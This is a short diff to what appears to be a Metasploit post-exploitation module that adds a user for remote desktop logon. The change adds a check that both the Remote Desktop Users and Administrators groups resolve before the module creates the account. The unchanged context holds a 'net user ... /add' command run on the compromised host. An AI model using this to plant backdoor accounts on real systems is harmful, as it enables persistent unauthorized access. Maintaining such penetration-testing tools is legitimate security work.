@@ -107,12 +107,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
-
   def addrdpusr(username, password,cleanup_rc)
-    rdu = resolve_sid("S-1-5-32-555")[:name]
-    admin = resolve_sid("S-1-5-32-544")[:name]
-
     print_status "Setting user account for logon"
     print_status "\tAdding User: #{username} with Password: #{password}"
     begin
@@ -120,6 +115,19 @@ class MetasploitModule < Msf::Post
         print_error("\tThe user #{username} already exists")
         return
       end
+
+      rdu_sid = resolve_sid("S-1-5-32-555")
+      admin_sid = resolve_sid("S-1-5-32-544")
+
+      if !rdu_sid[:mapped] || !admin_sid[:mapped]
+        print_error("\tThe Remote Desktop Users group is not mapped") if !rdu_sid[:mapped]
+        print_error("\tThe Administrators group is not mapped") if !admin_sid[:mapped]
+        print_error("\tNot adding user #{username}")
+        return
+      end
+
+      rdu = rdu_sid[:name]
+      admin = admin_sid[:name]
 
       user_added = false
       addusr_out = cmd_exec("cmd.exe", "/c net user #{username} #{password} /add")
